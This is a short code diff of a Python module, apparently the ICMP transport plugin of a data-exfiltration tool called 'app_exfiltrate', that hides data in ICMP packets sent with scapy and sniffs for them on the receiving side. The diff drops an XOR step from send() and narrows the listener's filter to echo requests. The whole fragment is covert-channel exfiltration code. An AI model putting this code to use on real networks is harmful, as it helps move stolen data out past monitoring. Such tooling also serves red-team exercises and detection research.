@@ -8,7 +8,7 @@ app_exfiltrate = None
 
 
 def send(data):
-    data = base64.b64encode(app_exfiltrate.xor(data))
+    data = base64.b64encode(data)
     app_exfiltrate.log_message(
         'info', "[icmp] Sending {} bytes with ICMP packet".format(len(data)))
     scapy.sendp(scapy.Ether() /
@@ -17,7 +17,8 @@ def send(data):
 
 def listen():
     app_exfiltrate.log_message('info', "[icmp] Listening for ICMP packets..")
-    scapy.sniff(filter="icmp", prn=analyze)
+    # Filter for echo requests only to prevent capturing generated replies
+    scapy.sniff(filter="icmp and icmp[0]=8", prn=analyze)
 
 
 def analyze(packet):
